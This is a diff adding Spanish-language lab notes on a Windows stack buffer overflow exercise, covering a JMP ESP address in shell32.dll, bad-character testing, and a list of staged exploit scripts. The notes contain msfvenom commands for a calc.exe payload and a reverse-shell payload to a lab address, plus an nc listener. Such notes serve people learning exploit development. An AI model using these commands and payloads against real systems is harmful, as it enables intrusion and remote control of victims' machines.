@@ -1,0 +1,27 @@
+- En el 5.py meto el jmp esp "\xD7\x30\x6B\x7E" como? pues yendo a view-ejecutable modules me va a llevar a otro sitio y allí 
+hacemos clic derecho en la entrada de “shell32.dll”, en la ventana de Módulos Ejecutables, y seleccionamos “Ver Código en la CPU”. Elmódulo “shell32.dll” tiene una instrucción “JMP ESP”. Nos lleva a la ventana principal, pero la superiror izquierda.
+Ahora para buscar la dirección search for-comand y ponemos JMP ESP y nos sale la direción: 7E6B30D7.
+
+- Probe que podía ejecutar en el programa inyectando la calculadora: msfvenom -a x86 --platform Windows -p windows/exec cmd=calc.exe -b '\x00\x0a\x0d\x20\x40' -f python
+
+- MUY IMPORTANTE: realizando las comprobaciones de los badchars no me funcionaba porque no se comia los valores \x20\x40 espacio y el @ Esto sucede sólo en este programa.
+- Antes de meter la calculadora o la shell reversa tengo que poner esto: buf =  "\xcc"  es para ver cuando puedo comenzar a meter. También lo meto en las comprobaciones de badchars.
+- Cuando compruebe badchars dejar estos valores al final \x0a\x0d aunque también son badchars, pero si los quito el programa no funciona y no puedo ejecutar nada, pero si los dejo no me dejaba ver y comprobar el resto de badchars, así que los pongo al final de badchars.
+
+- Para generar la reverse shell: msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 -b '\x00\x0a\x0d\x20\x40' -f python      hay se ve que tengo que poner los badchars.   nc -nlvp 443
+
+
+
+
+
+
+
+
+
+1_crash.py
+2_pattern.py
+3_eip.py
+4_badcharacters.py
+5_return.py
+6_shell.py
+
